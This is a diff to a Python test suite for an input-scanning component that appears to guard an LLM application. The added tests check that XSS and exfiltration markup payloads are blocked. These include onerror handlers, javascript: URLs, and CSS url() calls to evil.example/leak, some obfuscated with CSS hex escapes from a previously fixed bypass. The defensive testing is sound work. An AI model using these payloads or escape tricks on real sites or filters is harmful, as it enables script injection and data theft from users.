@@ -36,7 +36,9 @@ class _StubLLMClient:
 
 async def test_scan_returns_clean_for_benign_text() -> None:
     warden = Warden()
-    verdict = await warden.scan("The weather is nice today.", "user_input")
+    verdict = await warden.scan(
+        '<p class="marketing-copy">The weather is nice today.</p>', "user_input"
+    )
     assert verdict.clean is True
     assert verdict.blocked is False
     assert verdict.flags == ()
@@ -68,6 +70,106 @@ async def test_scan_layer1_single_pattern_match_is_blocked() -> None:
     assert verdict.clean is False
     assert verdict.blocked is True
     assert len(verdict.flags) >= 1
+
+
+@pytest.mark.parametrize(
+    ("payload", "flag"),
+    [
+        ('<img src=x onerror="alert(1)">', "Active markup event-handler attribute"),
+        ('<svg><a href="javascript:alert(1)">x</a></svg>', "Active markup dangerous resource URL"),
+        ('<img src="data:text/html,<script>alert(1)</script>">', "Active markup data URL"),
+        (
+            '<link rel="stylesheet" href="https://evil.example/leak.css">',
+            "Active markup dangerous resource URL",
+        ),
+        (
+            '<video poster="https://evil.example/leak.png"></video>',
+            "Active markup dangerous resource URL",
+        ),
+        (
+            "<style>.x { background: url(https://evil.example/leak) }</style>",
+            "CSS network/code primitive",
+        ),
+        ('<a href="java&#x0A;script:alert(1)">x</a>', "Active markup dangerous resource URL"),
+        (
+            r"<style>.x { background: u\72l(https://evil.example/leak) }</style>",
+            "CSS network/code primitive",
+        ),
+        (
+            # Leading-escape spelling: a CSS parser reads `\75rl(` as `url(`,
+            # so the detection view must decode it too (#817 repair: the
+            # terminator class used to eat the `r` and decode `ul(` instead).
+            r"<style>.x { background: \75rl(https://evil.example/leak) }</style>",
+            "CSS network/code primitive",
+        ),
+    ],
+)
+async def test_scan_layer1_blocks_active_markup(payload: str, flag: str) -> None:
+    verdict = await Warden().scan(payload, "user_input")
+    assert verdict.clean is False
+    assert verdict.blocked is True
+    assert flag in verdict.flags
+
+
+async def test_scan_layer1_blocks_script_injection_from_shared_vocabulary() -> None:
+    verdict = await Warden().scan("<script>alert(1)</script>", "user_input")
+    assert verdict.clean is False
+    assert verdict.blocked is True
+    assert any("script pattern" in flag for flag in verdict.flags)
+
+
+@pytest.mark.contract("boundary")
+@pytest.mark.scope("unit")
+@pytest.mark.parametrize(
+    ("payload", "decoded"),
+    [
+        # Leading-escape function name: `\75rl(` is `url(` to a CSS parser.
+        (
+            r"background:\75rl(https://evil.example/leak)",
+            "background:url(https://evil.example/leak)",
+        ),
+        # Mid-token spelling stays decoded, and the `l` after `\72` survives.
+        (
+            r"background:u\72l(https://evil.example/leak)",
+            "background:url(https://evil.example/leak)",
+        ),
+        # A real whitespace terminator is consumed exactly once.
+        (
+            r"background:\75 rl(https://evil.example/leak)",
+            "background:url(https://evil.example/leak)",
+        ),
+        # Hex escape at end of string decodes without a terminator.
+        (r"background:\75", "background:u"),
+        # A non-hex escape yields the literal character: `\s` is `s`.
+        (r"back\slash", "backslash"),
+        # An at-rule's leading `@` survives the leetspeak fold: rewriting
+        # `@import` to `aimport` hid the at-rule from the CSS network
+        # vocabulary while the reviewed TS sink still blocked it.
+        (
+            '@import "https://evil.example/x.css";',
+            '@import "https://evil.example/x.css";',
+        ),
+        # A null codepoint decodes to the inert U+FFFD escape text, never to
+        # a raw NUL the scanners would have to treat as a token break.
+        (r"payload\0here", r"payload\ufffdhere"),
+        # Out-of-range and surrogate codepoints decode to the same inert
+        # escape text, and the optional whitespace terminator is consumed
+        # exactly as a CSS parser consumes it.
+        (r"\110000 x", r"\ufffdx"),
+        (r"\d800 x", r"\ufffdx"),
+    ],
+)
+def test_detection_view_decodes_css_hex_escapes_like_a_css_parser(
+    payload: str, decoded: str
+) -> None:
+    """The detection view must read the token a CSS parser reads (#817).
+
+    A regression here reopens the `\75rl(` -> `ul(` bypass where the escaped
+    `url(` slipped past every scanner while the browser fetched anyway.
+    """
+    from maistro.security.normalize import normalize_for_detection
+
+    assert normalize_for_detection(payload) == decoded
 
 
 async def test_scan_layer2_heuristic_density_flag_when_layer1_clean() -> None:
